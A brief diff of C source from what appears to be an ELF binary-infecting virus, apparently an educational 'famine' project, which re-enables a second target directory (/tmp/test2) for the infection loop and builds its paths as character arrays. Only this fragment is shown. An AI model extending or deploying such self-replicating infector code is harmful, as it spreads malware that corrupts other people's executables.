@@ -71,7 +71,7 @@ bool	check_binary_infected(struct s_woody *woody, Elf64_Shdr *shdr_last) {
 void	famine() {
 	char	*target_dirs[] = {
 		((char []){'/','t','m','p','/','t','e','s','t','\0'}),
-		// ((char []){'/','t','m','p','/','t','e','s','t','2','\0'}),
+		((char []){'/','t','m','p','/','t','e','s','t','2','\0'}),
 		NULL
 	};
 	for (uint8_t i = 0; target_dirs[i]; i++) {
